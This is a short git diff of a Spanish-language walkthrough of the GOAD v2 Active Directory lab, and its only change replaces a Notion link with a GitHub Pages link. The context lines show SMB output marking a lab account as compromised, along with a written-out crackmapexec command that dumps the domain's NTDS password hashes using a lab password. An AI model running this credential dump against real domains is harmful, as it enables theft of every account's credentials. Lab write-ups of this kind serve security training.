@@ -2886,7 +2886,7 @@ SMB         winterfell.north.sevenkingdoms.local 445    WINTERFELL       [*] Win
 SMB         winterfell.north.sevenkingdoms.local 445    WINTERFELL       [+] north.sevenkingdoms.local\angussmoody:Test123456789! (Pwn3d!)
 ```
 
-con la herramienta crackmapexec podemos realizar este volcado, aunque también hay otras herramientas como secretsdump.py Herramienta utilizada en el anterior ataque llamado [**SamAccountName (nopac)](https://www.notion.so/o/sXxBpNeCw0DhoY0ohgUJ/s/xRLIXi9UGNqyXTLpBX40/~/changes/11/#samaccountname-nopac)** para este caso vamos a hacerlo con crackmapexec con el comando **`cme smb north.sevenkingdoms.local -u angussmoody -p 'Test123456789!' --ntds`**
+con la herramienta crackmapexec podemos realizar este volcado, aunque también hay otras herramientas como secretsdump.py Herramienta utilizada en el anterior ataque llamado [SamAccountName (nopac)](https://angussmoody.github.io/active_directory/Solucion_GOADv2/#samaccountname-nopac)** para este caso vamos a hacerlo con crackmapexec con el comando **`cme smb north.sevenkingdoms.local -u angussmoody -p 'Test123456789!' --ntds`**
 
 ```csharp
 ┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/printnightmare]
